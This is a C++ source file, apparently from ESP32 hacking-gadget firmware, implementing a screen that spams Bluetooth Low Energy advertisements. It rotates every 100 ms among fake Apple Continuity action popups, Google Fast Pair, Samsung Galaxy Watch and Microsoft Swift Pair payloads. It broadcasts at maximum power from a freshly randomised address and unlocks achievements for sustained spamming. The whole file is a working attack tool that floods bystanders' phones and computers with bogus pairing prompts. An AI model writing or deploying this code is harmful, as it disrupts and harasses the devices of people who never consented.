#include "BLEAllSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

// Payload tables (same wire formats as the per-platform screens).
static const uint8_t kAppleActionFlags[] = {0xC0, 0xC0, 0xC0, 0xC0, 0x40, 0xC0};
static const uint8_t kAppleActions[]     = {0x13, 0x27, 0x20, 0x09, 0x21, 0x2E};

static constexpr uint32_t kFastPairModels[] = {
  0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007, 0x090000,
  0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x821F66, 0xF52494,
};
static constexpr uint8_t kSamsungModels[] = {
  0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
  0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x20,
};
static constexpr const char kNameChars[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ";
static constexpr int kNameCharsLen = sizeof(kNameChars) - 1;

template <typename A> static int _count(const A& a) { return (int)(sizeof(a) / sizeof(a[0])); }

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLEAllSpamScreen::~BLEAllSpamScreen()
{
  _stop();
}

void BLEAllSpamScreen::onInit()
{
  int n = Achievement.inc("ble_spam_first");
  if (n == 1) Achievement.unlock("ble_spam_first");
  _spamStartMs   = millis();
  _spam1minFired = false;

  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  _pAdv = NimBLEDevice::getAdvertising();
  _pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
  _pAdv->setMinInterval(0x20);
  _pAdv->setMaxInterval(0x30);
  _pAdv->setScanResponse(false);

  _spam();
}

void BLEAllSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.goBack();
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_spam_1min");
    if (m == 1) Achievement.unlock("ble_spam_1min");
  }
  // Fast rotation so every platform is hit in quick succession ("all at once").
  if (now - _lastSpamMs >= 100) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLEAllSpamScreen::onRender()
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  static const char* kNames[] = {"iOS", "Android", "Samsung", "Windows"};
  String label = String("[") + _spinner[_spinIdx] + "] All: " + kNames[_type];
  sp.drawString(label.c_str(), bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLEAllSpamScreen::_spam()
{
  if (_pAdv) _pAdv->stop();

  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  // Random platform each burst (Bruce-style rotation across all families).
  _type = (uint8_t)random(4);  // 0..3, one payload family per burst
  switch (_type) {
    case 0: {  // Apple Continuity (NearbyAction modal)
      int i = random(_count(kAppleActions));
      uint8_t rnd[3]; esp_fill_random(rnd, 3);
      uint8_t mfg[9] = { 0x4C, 0x00, 0x0F, 0x05,
                         kAppleActionFlags[i], kAppleActions[i],
                         rnd[0], rnd[1], rnd[2] };
      advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
      break;
    }
    case 1: {  // Google Fast Pair
      uint32_t model = kFastPairModels[random(_count(kFastPairModels))];
      int8_t txPow = (int8_t)(random(120) - 100);
      uint8_t raw[14] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)((model >> 16) & 0xFF), (uint8_t)((model >> 8) & 0xFF),
        (uint8_t)(model & 0xFF),
        0x02, 0x0A, (uint8_t)txPow };
      advData.addData(std::string((char*)raw, sizeof(raw)));
      break;
    }
    case 2: {  // Samsung Galaxy Watch
      uint8_t model = kSamsungModels[random(_count(kSamsungModels))];
      uint8_t mfg[13] = { 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
                          0xFF, 0x00, 0x00, 0x43, model };
      advData.setManufacturerData(std::string((char*)mfg, sizeof(mfg)));
      break;
    }
    default: {  // Microsoft Swift Pair
      int nameLen = (int)random(6, 16);
      uint8_t mfg[5 + 15];
      mfg[0] = 0x06; mfg[1] = 0x00; mfg[2] = 0x03; mfg[3] = 0x00; mfg[4] = 0x80;
      for (int i = 0; i < nameLen; i++)
        mfg[5 + i] = (uint8_t)kNameChars[random(0, kNameCharsLen)];
      advData.setManufacturerData(std::string((char*)mfg, 5 + nameLen));
      break;
    }
  }

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLEAllSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}
